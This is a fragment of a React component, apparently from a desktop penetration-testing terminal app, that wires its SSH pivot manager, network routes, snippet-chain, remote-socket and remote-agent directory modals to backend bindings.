          onClose={() => setShowPivotManagerModal(false)}
          activeSessionId={sessionId}
          activeEngagementId={activeEngagement?.id || null}
          activeEngagementName={activeEngagement?.name || null}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: h.address,
            username: h.effectiveUser,
            port: h.effectivePort,
          }))}
          onLaunchTwoStepSshPivot={async (req) => {
            const api = getWailsBindings();
            if (!api?.LaunchTwoStepSshPivot) {
              throw new Error('LaunchTwoStepSshPivot API unavailable');
            }
            await api.LaunchTwoStepSshPivot(req);
            if (api.GetActiveTunnels) {
              const tuns = await api.GetActiveTunnels();
              setActiveTunnels(tuns || []);
            }
          }}
          onSendToTerminal={(sId, text) => {
            void getWailsBindings()?.WriteTerminal?.(sId, text);
          }}
          onSpawnLocalTerminal={(initialCmd, tabTitle) => {
            const api = getWailsBindings();
            if (api?.OpenLocalTerminal) {
              void api.OpenLocalTerminal('powershell', { cols: 120, rows: 34 }).then((sid) => {
                openSessionTab(sid, tabTitle || 'Pivot Console', undefined, '#10b981');
                setTimeout(() => {
                  void api.WriteTerminal?.(sid, `${initialCmd}\n`);
                }, 400);
              });
            } else {
              void handleOpenLocalTerminal('powershell');
            }
          }}
          getDefaultRoutes={async () => {
            const api = getWailsBindings();
            if (api?.GetDefaultNetworkRoutes) return api.GetDefaultNetworkRoutes();
            return [];
          }}
          listRoutes={async () => {
            const api = getWailsBindings();
            if (api?.ListNetworkRoutes) return api.ListNetworkRoutes();
            return [];
          }}
          saveRoute={async (route) => {
            const api = getWailsBindings();
            if (api?.SaveNetworkRoute) await api.SaveNetworkRoute(route);
          }}
          deleteRoute={async (routeId) => {
            const api = getWailsBindings();
            if (api?.DeleteNetworkRoute) await api.DeleteNetworkRoute(routeId);
          }}
          detectBinaries={async () => {
            const api = getWailsBindings();
            if (api?.DetectPivotBinaries) return api.DetectPivotBinaries();
            return [];
          }}
          startPivot={async (route) => {
            const api = getWailsBindings();
            if (api?.StartPivotInstance) return api.StartPivotInstance(route);
            throw new Error('StartPivotInstance API unavailable');
          }}
          stopPivot={async (instanceId) => {
            const api = getWailsBindings();
            if (api?.StopPivotInstance) await api.StopPivotInstance(instanceId);
          }}
          sendPivotInput={async (instanceId, input) => {
            const api = getWailsBindings();
            if (api?.SendPivotInput) await api.SendPivotInput(instanceId, input);
          }}
          listActivePivots={async () => {
            const api = getWailsBindings();
            if (api?.ListActivePivotInstances) return api.ListActivePivotInstances();
            return [];
          }}
          buildCommands={async (route, lhost) => {
            const api = getWailsBindings();
            if (api?.BuildPivotCommands) return api.BuildPivotCommands(route, lhost);
            return {
              tool: route.tool,
              lhost,
              proxyCommand: `${route.tool} --listen ${route.listenPort}`,
              linuxAgentCmd: '',
              windowsAgentCmd: '',
            };
          }}
          getLocalIPs={async () => {
            const api = getWailsBindings();
            if (api?.GetLocalNetworkIPs) return api.GetLocalNetworkIPs();
            return [];
          }}
          onOpenRouteHealth={() => {
            setShowPivotManagerModal(false);
            openRouteHealthTab();
          }}
          onSelectBinaryFile={(t) => getWailsBindings()?.SelectFileDialog?.(t, '', '') ?? Promise.resolve('')}
        />
      )}

      {showWinrmModal && renderWinrmManager(false, () => setShowWinrmModal(false))}

      {showChainsModal && (
        <SnippetChainsModal
          chains={chains.length > 0 ? chains : (vaultSummary.snippetChains || [])}
          hosts={vaultSummary.hosts.map((h) => ({
            id: h.id,
            label: h.label,
            address: `${h.effectiveUser}@${h.address}:${h.effectivePort}`,
          }))}
          activeSessionId={sessionId}
          activeHostId={chainsHostFilter || activeTab?.hostId || null}
          onSaveChain={handleSaveSnippetChain}
          onDeleteChain={handleDeleteSnippetChain}
          onRunChain={(c) => {
            setShowChainsModal(false);
            void handleTriggerChain(c);
          }}
          onClose={() => {
            setShowChainsModal(false);
            setChainsHostFilter(null);
          }}
          getFileConfig={async () => {
            const api = getWailsBindings();
            if (api?.GetSnippetChainsConfig) return api.GetSnippetChainsConfig();
            return { filePath: 'data/snippet_chains.json', chainCount: 0, exists: false };
          }}
          setFilePath={async (path) => {
            const api = getWailsBindings();
            if (api?.SetSnippetChainsPath) return api.SetSnippetChainsPath(path);
            throw new Error('SetSnippetChainsPath API not available');
          }}
          onReloadFromFile={async () => {
            const api = getWailsBindings();
            if (api?.ListSnippetChainsFromFile) {
              const loaded = await api.ListSnippetChainsFromFile();
              setChains(loaded);
              return loaded;
            }
            return [];
          }}
          onSelectFile={(t, fn, fp) => getWailsBindings()?.SelectFileDialog?.(t, fn, fp) ?? Promise.resolve('')}
          onSelectDirectory={(t) => getWailsBindings()?.SelectDirectoryDialog?.(t) ?? Promise.resolve('')}
        />
      )}

      {runnerModalChain && runnerModalContext && (
        <SnippetChainRunnerModal
          chain={runnerModalChain}
          sessionId={runnerActiveSessionId}
          hostLabel={runnerModalContext.hostLabel}
          context={runnerModalContext}
          onExecuteStep={handleExecuteChainStepFromRunner}
          onClose={() => {
            setRunnerModalChain(null);
            setRunnerModalContext(null);
          }}
        />
      )}

      {showRemoteSocketsModal && (
        <RemoteSocketsModal
          isOpen={showRemoteSocketsModal}
          onClose={() => setShowRemoteSocketsModal(false)}
          sshSessions={tabs.flatMap((t) =>
            collectPanes(t.rootNode)
              .filter(
                (p) =>
                  Boolean(p.hostId) &&
                  !p.paneType &&
                  !p.isRawTcp &&
                  !p.sessionId.startsWith('local-') &&
                  !p.sessionId.startsWith('serial-') &&
                  !p.sessionId.startsWith('winrm-') &&
                  !p.sessionId.startsWith('rawtcp-')
              )
              .map((p) => ({ id: p.sessionId, label: `${p.title} (${p.sessionId.slice(0, 8)})` }))
          )}
          defaultSessionId={activePane?.sessionId}
          activeEngagementId={activeEngagement?.id || null}
          onOpenApiUrl={(url, label) => {
            setApiTesterDraft({
              id: `req-tun-${Date.now()}`,
              engagementId: activeEngagement?.id || undefined,
              collectionName: 'Default Collection',
              name: `Tunnel: ${label}`,
              method: 'GET',
              url,
              params: [],
              headers: [{ key: 'Accept', value: 'application/json', enabled: true }],
              auth: { type: 'none' },
              bodyType: 'none',
              body: '',
              rawMode: false,
              rawRequest: '',
              routeId: '',
              timeoutSec: 20,
              followRedirects: true,
              useCookieJar: true,
              tlsSkipVerify: false,
            });
            openApiTesterTab();
          }}
        />
      )}
      {showRemoteDirPicker && remoteExecContext.activeAgent && (
        <RemoteDirPickerModal
          isOpen={showRemoteDirPicker}
          agentLabel={remoteExecContext.activeAgent.hostname || remoteExecContext.activeAgent.label}
          initialPath={sidebarTransferDir || remoteExecContext.activeAgent.homeDir || '~'}
          onListDir={async (dirPath) => {
            const api = getWailsBindings();
            if (!api?.ListRemoteAgentDir) {
              throw new Error('Remote directory listing binding unavailable');
            }
            return api.ListRemoteAgentDir(dirPath);
          }}
          onMkdir={async (dirPath) => {
            const api = getWailsBindings();
            if (!api?.MakeRemoteAgentDir) {
              throw new Error('Remote mkdir binding unavailable');
            }
            await api.MakeRemoteAgentDir(dirPath);
          }}
          onSelectDir={(dirPath) => {
            setSidebarTransferDir(dirPath);
            setSidebarTransferError('');
            const api = getWailsBindings();
            if (api?.ListHostedTransferFiles) {
              setSidebarTransferLoadingFiles(true);
              void api
                .ListHostedTransferFiles(dirPath)
                .then((files) => setSidebarTransferFiles(files || []))
                .catch((err: unknown) =>
                  setSidebarTransferError(err instanceof Error ? err.message : String(err))
                )
                .finally(() => setSidebarTransferLoadingFiles(false));
            }
          }}
          onOpenShellInDir={(dirPath) => void handleOpenRemoteAgentShell(dirPath)}
          onClose={() => setShowRemoteDirPicker(false)}
        />
      )}
    </main>
  );
}
